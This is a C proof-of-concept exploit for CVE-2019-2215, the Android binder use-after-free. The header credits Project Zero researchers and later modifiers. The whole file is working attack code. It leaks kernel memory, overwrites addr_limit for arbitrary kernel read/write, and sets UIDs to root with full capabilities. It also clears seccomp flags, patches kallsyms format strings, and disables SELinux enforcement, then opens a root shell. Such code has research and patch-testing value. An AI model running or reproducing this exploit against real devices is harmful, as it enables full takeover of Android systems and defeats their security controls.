// writes xs
/*
 * POC to gain arbitrary kernel R/W access using CVE-2019-2215
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 *
 * Jann Horn & Maddie Stone of Google Project Zero
 * Some stuff from Grant Hernandez to achieve root (Oct 15th 2019)
 * Modified by Alexander R. Pruss for devices where WAITQUEUE_OFFSET is 0x98
 *
 * 3 October 2019
*/

#define _GNU_SOURCE
#include <time.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>

#define MIN(x,y) ((x)<(y) ? (x) : (y))
#define MAX(x,y) ((x)>(y) ? (x) : (y))

#define BINDER_THREAD_EXIT 0x40046208ul
// NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
#define BINDER_THREAD_SZ 0x188
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
#define WAITQUEUE_OFFSET (0x98)
#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10
#define UAF_SPINLOCK 0x10001
#define PAGE 0x1000
#define TASK_STRUCT_OFFSET_FROM_TASK_LIST 0xE8

unsigned long kernel_read_ulong(unsigned long kaddr);

void hexdump_memory(void *_buf, size_t byte_count) {
   unsigned char* buf = _buf;
  unsigned long byte_offset_start = 0;
  if (byte_count % 16)
    errx(1, "hexdump_memory called with non-full line");
  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
          byte_offset += 16) {
    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%08lx  ", byte_offset);
    for (int i=0; i<16; i++) {
      linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<16; i++) {
      char c = buf[byte_offset + i];
      if (isalnum(c) || ispunct(c) || c == ' ') {
        *(linep++) = c;
      } else {
        *(linep++) = '.';
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
  }
}

int epfd;

int binder_fd;

unsigned long iovec_size(struct iovec* iov, int n) {
    unsigned long sum = 0;
    for (int i=0; i<n; i++)
        sum += iov[i].iov_len;
    return sum;
}

unsigned long iovec_max_size(struct iovec* iov, int n) {
    unsigned long m = 0;
    for (int i=0; i<n; i++) {
        if (iov[i].iov_len > m)
            m = iov[i].iov_len;
    }
    return m;
}

int clobber_data(unsigned long payloadAddress, const void *src, unsigned long payloadLength)
{
  int dummyBufferSize = MAX(UAF_SPINLOCK, PAGE);
  char* dummyBuffer = malloc(dummyBufferSize);
  if (dummyBuffer == NULL) err(1, "allocating dummyBuffer");
  memset(dummyBuffer, 0, dummyBufferSize);
  
  printf("PARENT: clobbering at 0x%lx\n", payloadAddress);
  
  struct epoll_event event = { .events = EPOLLIN };
  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");

  unsigned long testDatum = 0;
  unsigned long const testValue = 0xABCDDEADBEEF1234ul;
  
  struct iovec iovec_array[IOVEC_ARRAY_SZ];
  memset(iovec_array, 0, sizeof(iovec_array));
  
  const unsigned SECOND_WRITE_CHUNK_IOVEC_ITEMS = 3;
  
  unsigned long second_write_chunk[SECOND_WRITE_CHUNK_IOVEC_ITEMS*2] = {
    (unsigned long)dummyBuffer, /* iov_base (currently in use) */   // wq->task_list->next
    SECOND_WRITE_CHUNK_IOVEC_ITEMS * 0x10, /* iov_len (currently in use) */  // wq->task_list->prev
    
    payloadAddress, //(unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
    payloadLength,
    
    (unsigned long)&testDatum, 
    sizeof(testDatum), 
  };
  
  int delta = (UAF_SPINLOCK+sizeof(second_write_chunk)) % PAGE;
  int paddingSize = delta == 0 ? 0 : PAGE-delta;

  iovec_array[IOVEC_INDX_FOR_WQ-1].iov_base = dummyBuffer;
  iovec_array[IOVEC_INDX_FOR_WQ-1].iov_len = paddingSize; 
  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummyBuffer;
  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0; // spinlock: will turn to UAF_SPINLOCK
  iovec_array[IOVEC_INDX_FOR_WQ+1].iov_base = second_write_chunk; // wq->task_list->next: will turn to payloadAddress of task_list
  iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len = sizeof(second_write_chunk); // wq->task_list->prev: will turn to payloadAddress of task_list
  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_base = dummyBuffer; // stuff from this point will be overwritten and/or ignored
  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len = UAF_SPINLOCK;
  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_base = dummyBuffer;
  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len = payloadLength;
  iovec_array[IOVEC_INDX_FOR_WQ+4].iov_base = dummyBuffer;
  iovec_array[IOVEC_INDX_FOR_WQ+4].iov_len = sizeof(testDatum);
  int totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
 
  int socks[2];
  //if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "socketpair");
  pipe(socks);
  if ((fcntl(socks[0], F_SETPIPE_SZ, PAGE)) != PAGE) err(1, "pipe size");
  if ((fcntl(socks[1], F_SETPIPE_SZ, PAGE)) != PAGE) err(1, "pipe size");

  pid_t fork_ret = fork();
  if (fork_ret == -1) err(1, "fork");
  if (fork_ret == 0){
    /* Child process */
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(2);
    printf("CHILD: Doing EPOLL_CTL_DEL.\n");
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
    printf("CHILD: Finished EPOLL_CTL_DEL.\n");
    
    char* f = malloc(totalLength); 
    if (f == NULL) err(1,"Allocating memory");
    memset(f,'-',paddingSize+UAF_SPINLOCK);
    unsigned long pos = paddingSize+UAF_SPINLOCK;
    memcpy(f+pos,second_write_chunk,sizeof(second_write_chunk));
    pos += sizeof(second_write_chunk);
    memcpy(f+pos,src,payloadLength);
    pos += payloadLength;
    memcpy(f+pos,&testValue,sizeof(testDatum));
    pos += sizeof(testDatum);
    write(socks[1], f, pos);
    printf("CHILD: wrote %lu\n", pos);
    close(socks[1]);
    close(socks[0]);
    exit(0);
  }
  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
  struct msghdr msg = {
    .msg_iov = iovec_array,
    .msg_iovlen = IOVEC_ARRAY_SZ
  };
  int recvmsg_result = readv(socks[0], iovec_array, IOVEC_ARRAY_SZ); // recvmsg(socks[0], &msg, MSG_WAITALL);
/*  struct mmsghdr mmsg;
  mmsg.msg_hdr.msg_iov = iovec_array;
  mmsg.msg_hdr.msg_iovlen = IOVEC_ARRAY_SZ;
  mmsg.msg_len = totalLength;
    struct timespec timeout;
    timeout.tv_sec = 10;
    timeout.tv_nsec = 0;
    int recvmsg_result = recvmmsg(socks[0], &mmsg, 1, MSG_WAITALL, &timeout);  */

    printf("PARENT: testDatum = %lx\n", testDatum);
    if (testDatum != testValue)
        errx(1, "clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
    hexdump_memory(dummyBuffer, 16);
    hexdump_memory(dummyBuffer+UAF_SPINLOCK-16, 16);
  
  printf("recvmsg() returns %d, expected %d\n", recvmsg_result,
      totalLength);
   free(dummyBuffer);
   
   return testDatum != testValue;
}


void leak_data(void* leakBuffer, int leakAmount, 
    unsigned long extraLeakAddress, void* extraLeakBuffer, int extraLeakAmount,
    unsigned long* task_struct_ptr_p, unsigned long* kstack_p)
{
  unsigned long const minimumLeak = TASK_STRUCT_OFFSET_FROM_TASK_LIST+8;
  unsigned long adjLeakAmount = MAX(leakAmount, 4336); // TODO: figure out why we need at least 4336; I would think that minimumLeak should be enough
 
  struct epoll_event event = { .events = EPOLLIN };
  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");

  struct iovec iovec_array[IOVEC_ARRAY_SZ];

  memset(iovec_array, 0, sizeof(iovec_array));
  
  int delta = (UAF_SPINLOCK+minimumLeak) % PAGE;
  int paddingSize = (delta == 0 ? 0 : PAGE-delta) + PAGE;

  iovec_array[IOVEC_INDX_FOR_WQ-2].iov_base = (unsigned long*)0xDEADBEEF; 
  iovec_array[IOVEC_INDX_FOR_WQ-2].iov_len = PAGE; 
  iovec_array[IOVEC_INDX_FOR_WQ-1].iov_base = (unsigned long*)0xDEADBEEF; 
  iovec_array[IOVEC_INDX_FOR_WQ-1].iov_len = paddingSize-PAGE; 
  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = (unsigned long*)0xDEADBEEF;
  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0; /* spinlock: will turn to UAF_SPINLOCK */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (unsigned long*)0xDEADBEEF; /* wq->task_list->next */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = adjLeakAmount; /* wq->task_list->prev */
  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (unsigned long*)0xDEADBEEF; // we shouldn't get to here
  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = extraLeakAmount+UAF_SPINLOCK+8; 
  unsigned long totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
  unsigned long maxLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
  unsigned char* dataBuffer = malloc(maxLength);
  
  if (dataBuffer == NULL) err(1, "Allocating %ld bytes\n", maxLength);
  
  for (int i=0; i<IOVEC_ARRAY_SZ; i++) 
      if (iovec_array[i].iov_base == (unsigned long*)0xDEADBEEF)
          iovec_array[i].iov_base = dataBuffer;
  
  int b;
  int pipefd[2];
  int leakPipe[2];
  if (pipe(pipefd)) err(1, "pipe");
  if (pipe(leakPipe)) err(2, "pipe");
  if ((fcntl(pipefd[0], F_SETPIPE_SZ, PAGE)) != PAGE) err(1, "pipe size");
  if ((fcntl(pipefd[1], F_SETPIPE_SZ, PAGE)) != PAGE) err(1, "pipe size");

  pid_t fork_ret = fork();
  if (fork_ret == -1) err(1, "fork");
  if (fork_ret == 0){
    /* Child process */
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(1);
    printf("CHILD: Doing EPOLL_CTL_DEL.\n");
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
    printf("CHILD: Finished EPOLL_CTL_DEL.\n");

    // first page: dummy data

    unsigned long size1 = paddingSize+UAF_SPINLOCK+minimumLeak;
    printf("CHILD: initial %lx\n", size1);
    char buffer[size1];
    memset(buffer, 0, size1);
    if (read(pipefd[0], buffer, size1) != size1) err(1, "reading first part of pipe");

    memcpy(dataBuffer, buffer+size1-minimumLeak, minimumLeak);
    if (memcmp(dataBuffer,dataBuffer+8,8)) err(1,"Addresses don't match");
    unsigned long addr=0;
    memcpy(&addr, dataBuffer, 8);
    if (addr == 0) err(1, "bad address");
    unsigned long task_struct_ptr=0;

    memcpy(&task_struct_ptr, dataBuffer+TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
    printf("CHILD: task_struct_ptr = 0x%lx\n", task_struct_ptr);

    if (extraLeakAmount > 0 || kstack_p != NULL) {
        unsigned long extra[6] = { 
            addr,
            adjLeakAmount,
            extraLeakAddress,
            extraLeakAmount,
            task_struct_ptr+8,
            8
        };
        printf("CHILD: clobbering with extra leak address %lx at %lx\n", (unsigned long)extraLeakAddress, addr);
        clobber_data(addr, &extra, sizeof(extra)); 
        printf("CHILD: clobbered\n");
    }

    if(read(pipefd[0], dataBuffer+minimumLeak, adjLeakAmount-minimumLeak) != adjLeakAmount-minimumLeak) err(1, "leaking");
    
    write(leakPipe[1], dataBuffer, adjLeakAmount);
    //hexdump_memory(dataBuffer, adjLeakAmount);
    
    if (extraLeakAmount > 0) {
        printf("CHILD: extra leak\n");
        if(read(pipefd[0], extraLeakBuffer, extraLeakAmount) != extraLeakAmount) err(1, "extra leaking");
        write(leakPipe[1], extraLeakBuffer, extraLeakAmount);
        //hexdump_memory(extraLeakBuffer, (extraLeakAmount+15)/16*16);
    }
    if (kstack_p != NULL) {
        if(read(pipefd[0], dataBuffer, 8) != 8) err(1, "leaking kstack");
        printf("CHILD: task_struct_ptr = 0x%lx\n", *(unsigned long *)dataBuffer);
        write(leakPipe[1], dataBuffer, 8);
    }
        
    close(pipefd[1]);
    printf("CHILD: Finished write to FIFO.\n");
    exit(0);
  }
  printf("PARENT: Calling WRITEV\n");
  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
  b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
  printf("PARENT: writev() returns 0x%x\n", (unsigned int)b);
  if (b != totalLength) 
        errx(1, "writev() returned wrong value: needed 0x%lx", totalLength);
  // leaked data
  printf("PARENT: Reading leaked data\n");
  
  b = read(leakPipe[0], dataBuffer, adjLeakAmount);
  if (b != adjLeakAmount) errx(1, "reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);

  if (leakAmount > 0)
      memcpy(leakBuffer, dataBuffer, leakAmount);

  if (extraLeakAmount != 0) {  
      printf("PARENT: Reading extra leaked data\n");
      b = read(leakPipe[0], extraLeakBuffer, extraLeakAmount);
      if (b != extraLeakAmount) errx(1, "reading extra leak: read 0x%x needed 0x%x", b, extraLeakAmount);
  }

  if (kstack_p != NULL) {
    if (read(leakPipe[0], kstack_p, 8) != 8) err(1, "reading kstack");
  }

  if (task_struct_ptr_p != NULL)
      memcpy(task_struct_ptr_p, dataBuffer+TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
  
  int status;
  wait(&status);
  //if (wait(&status) != fork_ret) err(1, "wait");

  free(dataBuffer);

  printf("PARENT: Done with leaking\n");
}

int kernel_rw_pipe[2];

void reset_kernel_pipes() {
    close(kernel_rw_pipe[0]);
    close(kernel_rw_pipe[1]);
    if (pipe(kernel_rw_pipe)) err(1, "kernel_rw_pipe");
}

int raw_kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
  if (len > PAGE) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
  if (write(kernel_rw_pipe[1], buf, len) != len ||
     read(kernel_rw_pipe[0], (void*)kaddr, len) != len) {
      reset_kernel_pipes();
      return 0;
  }
  return len;
}

void kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
    if (len != raw_kernel_write(kaddr,buf,len)) err(1, "error with kernel writing");
}

int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
  if (len > PAGE) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
  if (write(kernel_rw_pipe[1], (void*)kaddr, len) != len || read(kernel_rw_pipe[0], buf, len) != len) {
      reset_kernel_pipes();
      return 0;
  }
  return len;
}

void kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
  if (len > PAGE) errx(1, "kernel reads over PAGE_SIZE are messy, tried 0x%lx", len);
  if (len != raw_kernel_read(kaddr,buf,len)) err(1, "error with kernel reading");
}

unsigned long kernel_read_ulong(unsigned long kaddr) {
  unsigned long data;
  kernel_read(kaddr, &data, sizeof(data));
  return data;
}
void kernel_write_ulong(unsigned long kaddr, unsigned long data) {
  kernel_write(kaddr, &data, sizeof(data));
}
void kernel_write_uint(unsigned long kaddr, unsigned int data) {
  kernel_write(kaddr, &data, sizeof(data));
}
void kernel_write_uchar(unsigned long kaddr, unsigned char data) {
  kernel_write(kaddr, &data, sizeof(data));
}

// $ uname -a
// Linux localhost 3.18.71-perf+ #1 SMP PREEMPT Tue Jul 17 14:44:34 KST 2018 aarch64
#define OFFSET__thread_info__flags 0x000
#define OFFSET__task_struct__stack 0x008
#define OFFSET__task_struct__mm    0x308
//#define OFFSET__task_struct__comm 0x558 // not needed
#define OFFSET__task_struct__cred 0x550
#define OFFSET__task_struct__seccomp  (OFFSET__task_struct__cred+0xa0) // WRONG!??!
#define OFFSET__cred__uid 0x004
#define OFFSET__cred__securebits    0x024
#define OFFSET__cred__cap_inheritable 0x028
#define OFFSET__cred__cap_permitted 0x030
#define OFFSET__cred__cap_effective 0x038
#define OFFSET__cred__cap_bset      0x040
#define OFFSET__cred__cap_ambient   0x048
#define OFFSET__cred__security      0x078
#define OFFSET__cred__user_ns       0x088

//#define OFFSET__task_struct__mm 0x520
//#define OFFSET__mm_struct__user_ns 0x300
//#define OFFSET__uts_namespace__name__version 0xc7
// SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug
//#define SYMBOL__init_user_ns 0x202f2c8
//#define SYMBOL__init_task 0x20257d0
//#define SYMBOL__init_uts_ns 0x20255c0

int fixKallsymsFormatStrings(unsigned long start) {
  int found = 0;
  
  start &= ~(PAGE-1);
  
  unsigned long searchTarget;

  memcpy(&searchTarget, "%pK %c %", 8);
 
  int backwards = 1;
  int forwards = 1;
  int direction = 1;
  unsigned long forwardAddress = start;
  unsigned long backwardAddress = start - PAGE;
  unsigned long page[PAGE/8];
  
  printf("MAIN: searching for kallsyms format strings\n");
 
  while ((backwards || forwards) && found < 2) {
      unsigned long address = direction > 0 ? forwardAddress : backwardAddress;
      
      if (address < 0xffffffc000000000ul || address >= 0xffffffd000000000ul || raw_kernel_read(address, page, PAGE) != PAGE) {
          if (direction > 0)
              forwards = 0;
          else
              backwards = 0;
      }
      else {
          for (int i=0;i<PAGE/8;i++) 
              if (page[i] == searchTarget) {
                  unsigned long a = address + 8*i;
                  
                  char fmt[16];
                  
                  kernel_read(a, fmt, 16);
                  
                  if (!strcmp(fmt, "%pK %c %s\t[%s]\x0A")) {
                      found++;
                      kernel_write(a, "%p %c %s\t[%s]\x0A", 15);
                      printf("MAIN: patching longer version at %lx\n", a);
                  }
                  else if (!strcmp(fmt, "%pK %c %s\x0A")) {
                      found++;
                      kernel_write(a, "%p %c %s\x0A", 10);
                      printf("MAIN: patching shorter version at %lx\n", a);
                  }
                  
                  if (found >= 2)
                      return 2;
              }
      }
                  
      if (direction > 0)
          forwardAddress += PAGE;
      else
          backwardAddress -= PAGE;
      
      direction = -direction;
      
      if (direction < 0 && !backwards) {
          direction = 1;
      }
      else if (direction > 0 && !forwards) {
          direction = -1;
      }
  }
  
  return found;
}

unsigned long findSymbol(unsigned long pointInKernelMemory, char* symbol) {
    char buf[1024];
    FILE* ks = fopen("/proc/kallsyms", "r");
    if (ks == NULL || NULL == fgets(buf, 1024, ks)) 
        err(1, "Reading /proc/kallsyms");
    fclose(ks);
    if (strncmp(buf, "0000000000000000", 16) == 0 && 0 == fixKallsymsFormatStrings(pointInKernelMemory)) {
        err(1, "Cannnot fix kallsyms format string");
    }
    ks = fopen("/proc/kallsyms", "r");
    unsigned l = strlen(symbol);
    while (NULL != fgets(buf, 1024, ks)) {
        char *p = buf+17;
        while (isspace(*p)) p++;
        p++;
        while (isspace(*p)) p++;
        if (!strncmp(p, symbol, l) && p[l] == '\x0A') {
            unsigned long address;
            sscanf(buf, "%lx", &address);
            fclose(ks);
            return address;
        }
    }    
    fclose(ks);
    return 0;
}

int main(int argc, char** argv) {
  printf("Starting POC\n");

  if (pipe(kernel_rw_pipe)) err(1, "kernel_rw_pipe");

  binder_fd = open("/dev/binder", O_RDONLY);
  epfd = epoll_create(1000);

  int leakSize = argc < 2 ? 2*4096+8 : atoi(argv[1]); // +9
  printf("Leak size %d\n", leakSize);
  unsigned char* leaked = malloc(leakSize);
  if (leaked == NULL) err(1, "Allocating leak buffer");
  unsigned long kstack = 0xDEADBEEFDEADBEEFul;
  unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;
  leak_data(leaked, leakSize, 0, NULL, 0, &task_struct_ptr, &kstack);
  if (leakSize >= 0) {
//      hexdump_memory(leaked, leakSize/16*16);
  }
  printf("task_struct_ptr = %lx\n", (unsigned long)task_struct_ptr);
  printf("stack = %lx\n", kstack);
  printf("Clobbering addr_limit\n");
  unsigned long const src=0xFFFFFFFFFFFFFFFEul;
  clobber_data(kstack+8, &src, 8);
  
  printf("current->kstack == 0x%lx\n", kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__stack));
  
  char task_struct_data[0x900];
  kernel_read(task_struct_ptr, task_struct_data, sizeof(task_struct_data));
  printf("task_struct\n");
  hexdump_memory(task_struct_data, sizeof(task_struct_data)); 

  unsigned long thread_info_ptr = kstack;

  free(leaked);

  setbuf(stdout, NULL);
  printf("should have stable kernel R/W now\n");


  /*
  unsigned long mm_ptr = kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__mm);
  char mm_data[0x1000];
  kernel_read(mm_ptr, mm_data, sizeof(mm_data));
  printf("mm\n");
  hexdump_memory(mm_data, sizeof(mm_data)); */
  
  printf("cred\n");
  unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__cred);
  /*
  char cred_data[0x200];
  kernel_read(cred_ptr, cred_data, sizeof(cred_data));
  hexdump_memory(cred_data, sizeof(cred_data));  */
  
  for (int i = 0; i < 8; i++)
    kernel_write_uint(cred_ptr+OFFSET__cred__uid + i*4, 0);

  if (getuid() != 0) {
    printf("MAIN: Error changing UIDs to 0.\n");
    exit(1);
  }
  
  printf("MAIN: UID = 0\n");  
  
  // reset securebits
  kernel_write_uint(cred_ptr+OFFSET__cred__securebits, 0);

  //kernel_write_ulong(cred_ptr+OFFSET__cred__cap_inheritable, 0x3fffffffffUL);
  kernel_write_ulong(cred_ptr+OFFSET__cred__cap_permitted, 0x3fffffffffUL);
  kernel_write_ulong(cred_ptr+OFFSET__cred__cap_effective, 0x3fffffffffUL);
  kernel_write_ulong(cred_ptr+OFFSET__cred__cap_bset, 0x3fffffffffUL);
  //kernel_write_ulong(cred_ptr+OFFSET__cred__cap_ambient, 0x3fffffffffUL);
  
  printf("MAIN: enabled capabilities\n");
  
/*  FILE* f = fopen("/proc/kallsyms", "r");
  char line[1024];
  while(NULL != (fgets(line, 1024, f))) puts(line); */
  
  unsigned long user_ns = kernel_read_ulong(cred_ptr+OFFSET__cred__user_ns);
  printf("MAIN: user_ns = %lx\n", user_ns);
  
  printf("MAIN: SECCOMP status %d\n", prctl(PR_GET_SECCOMP));
  if (prctl(PR_GET_SECCOMP)) {
    printf("MAIN: *TODO*: disabling SECCOMP\n");
    kernel_write_ulong(thread_info_ptr + OFFSET__thread_info__flags, 0);
    //kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp + 8, 0);
    //kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp, 0);
  }
  printf("MAIN: SECCOMP status %d\n", prctl(PR_GET_SECCOMP));
  
  /*
  unsigned long pk1 = 0xffffffc001403b70+0x888; // FFFFFFC0014043F8
  unsigned long pk2 = 0xffffffc001403b70+0x898; // FFFF FFC0 0140 4408
  
  // enable kallsyms
  kernel_write_uchar(pk1+2, ' ');
  kernel_write_uchar(pk2+2, ' ');
  
  unsigned long selinuxenforcing = 0xffffffc0019eea94; */
  
  printf("searching for selinux_enforcing\n");
  unsigned long selinux_enforcing = findSymbol(user_ns, "selinux_enforcing");
  if (selinux_enforcing == 0)
      printf("MAIN: **FAIL** cannot disable selinux enforcing\n");
  else {
      printf("MAIN: found selinux_enforcing at %lx\n", selinux_enforcing);
      kernel_write_uint(selinux_enforcing, 0);
      printf("MAIN: disabled selinux enforcing\n");
  }
  
//  kernel_read(task_struct_ptr, task_struct_data, sizeof(task_struct_data));
//  printf("task_struct\n");
//  hexdump_memory(task_struct_data, sizeof(task_struct_data));

  system("sh");
  
 /*
  unsigned long base = user_ns; // 0xffffffc01a4bf8; //0xffffffc01c0000;
  unsigned long size = 10*1024*1024;
  for (unsigned long i=0; i<size ;i+=PAGE) {
      char buf[PAGE];
      printf("at %lx:\n", base-i);
      kernel_read(base-i, buf, PAGE);
      hexdump_memory(buf, PAGE);
  }
*/
  
  
  exit(0);


  unsigned long current_cred_security = kernel_read_ulong(cred_ptr+OFFSET__cred__security);
  printf("[+] security %lx\n", current_cred_security);
  
 for (int i = 0; i < 2; i++)
    kernel_write_uint(current_cred_security + i*4, 1);
  printf("[+] before 2\n");
  kernel_write_uint(current_cred_security + 0, 1);
  printf("[+] before 3\n");
  kernel_write_uint(current_cred_security + 8, 7);

  kernel_write_ulong(current_cred_security, 0x0100000001UL);

  kernel_write_uint(current_cred_security + 8, 7);
  printf("[+] SID -> init (7)\n");
  printf("MAIN: set SID\n");
  
  system("setenforce 0");
  
#if 0 // TODO
  /* in case you want to do stuff with the creds, to show that you can get them: */
  unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
  printf("current->mm == 0x%lx\n", current_mm);
  unsigned long current_user_ns = kernel_read_ulong(current_mm + OFFSET__mm_struct__user_ns);
  printf("current->mm->user_ns == 0x%lx\n", current_user_ns);
  unsigned long kernel_base = current_user_ns - SYMBOL__init_user_ns;
  printf("kernel base is 0x%lx\n", kernel_base);
  if (kernel_base & 0xfffUL) errx(1, "bad kernel base (not 0x...000)");
  unsigned long init_task = kernel_base + SYMBOL__init_task;
  printf("&init_task == 0x%lx\n", init_task);
  unsigned long init_task_cred = kernel_read_ulong(init_task + OFFSET__task_struct__cred);
  printf("init_task.cred == 0x%lx\n", init_task_cred);
  unsigned long my_cred = kernel_read_ulong(current_ptr + OFFSET__task_struct__cred);
  printf("current->cred == 0x%lx\n", my_cred);

  unsigned long init_uts_ns = kernel_base + SYMBOL__init_uts_ns;
  char new_uts_version[] = "EXPLOITED KERNEL";
  kernel_write(init_uts_ns + OFFSET__uts_namespace__name__version, new_uts_version, sizeof(new_uts_version));
#endif  
}
